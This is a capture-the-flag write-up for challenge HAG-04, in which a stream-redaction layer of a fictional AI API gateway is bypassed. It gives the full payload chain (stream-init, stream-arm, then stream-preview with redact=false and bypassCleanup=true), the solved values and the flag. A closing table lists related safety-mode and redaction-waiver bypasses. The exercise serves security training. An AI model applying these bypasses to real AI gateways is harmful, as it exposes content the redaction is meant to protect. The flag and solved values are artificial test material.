# CTF — Track 03 · HAG-04 · HELIOS API Gateway · Stream Chunk Leak

> Side activity — NOT a learning record. Status: ✅ SOLVED 2026-06-21.

**Flag:** `KA{hag_stream_chunk_leak_trainingflag}`

## Mission
HELIOS streams output through a redaction pass. Raw chunks exist in a buffer before redaction runs. The buffer must be initialised, armed with a signature, then accessed with the right chunk offset and cleanup bypass to capture pre-redaction content.

## Attack chain
1. `stream-init` → `bufferKey` + `seedHex`
2. Compute `bufferSig = base64(reverse(bufferKey))`
3. `stream-arm(bufferKey, bufferSig)` → `armToken`
4. Compute `chunkOffset = int(seedHex, 16) + 1`
5. `stream-preview(capture=raw, redact=false, bufferKey, armToken, chunkOffset, bypassCleanup=true)` → raw chunks → flag

## Solved data
| item | value |
|---|---|
| bufferKey | `bk-4d2c` |
| seedHex | `3a` |
| reversed bufferKey | `c2d4-kb` |
| bufferSig | `YzJkNC1rYg==` |
| armToken | `arm-ec97` |
| chunkOffset | `59` (0x3a + 1 = 58 + 1) |
| flag | `KA{hag_stream_chunk_leak_trainingflag}` |

## Solution walkthrough

### Step 1 — initialise buffer
```javascript
payload: { actionId: 'stream-init' }
```
Response: `bufferKey: "bk-4d2c"`, `seedHex: "3a"`.

### Step 2 — compute bufferSig
```python
import base64
base64.b64encode('bk-4d2c'[::-1].encode()).decode()
# reverse("bk-4d2c") = "c2d4-kb"
# → YzJkNC1rYg==
```

### Step 3 — arm the buffer
```javascript
payload: { actionId: 'stream-arm', bufferKey: 'bk-4d2c', bufferSig: 'YzJkNC1rYg==' }
```
Response: `armToken: "arm-ec97"`.

### Step 4 — compute chunkOffset
```python
int('3a', 16) + 1  # 58 + 1 = 59
```

### Step 5 — preview raw stream
```javascript
payload: {
  actionId: 'stream-preview',
  capture: 'raw', redact: false,
  bufferKey: 'bk-4d2c', armToken: 'arm-ec97',
  chunkOffset: 59, bypassCleanup: true
}
```
Response: `rawChunks[1]` = protected content before redaction → flag.

## Key learnings

### Attack class: TOCTOU — read before redaction runs
The flag name says it: stream *chunk* leak. Content passed through a pre-redaction buffer before the redaction pass ran. By capturing at `chunkOffset=59` (the seed offset + 1, pointing past the safe preamble) with `redact=false` and `bypassCleanup=true`, the raw pre-redaction content was readable. This is a classic time-of-check/time-of-use race at the pipeline level.

### Client-controlled redaction flag
`redact=false` was a client-supplied boolean that disabled the redaction pass entirely. A field that disables security processing must never be client-controllable. Same root cause as HAG-02's `safetyMode`.

### bypassCleanup = client-controlled buffer retention
The cleanup pass would have wiped the raw buffer after streaming. `bypassCleanup=true` prevented it, keeping the pre-redaction chunks accessible. Another example of a client-supplied field that disables a safety mechanism.

### chunkOffset arithmetic as access control
`chunkOffset = int(seedHex, 16) + 1` pointed to the sensitive chunk. The seed was returned by the server, and the formula was in the artifact note. The "offset" check was meant to verify the caller had seen the server's seed — but since both seed and formula were disclosed, any attacker could derive the correct offset.

## HAG track pattern

| # | Challenge | Core vuln | Client bypass field |
|---|---|---|---|
| HAG-01 | Debug echo | Debug path not removed | `mode=debug`, `echoTarget` |
| HAG-02 | Safety mode tamper | Client-controlled safetyMode | `safetyMode`, `ackLegacy` |
| HAG-03 | Transcript export leak | Undocumented analyst path | `format=analyst`, `redactionWaiver` |
| HAG-04 | Stream chunk leak | Pre-redaction buffer readable | `redact=false`, `bypassCleanup=true` |
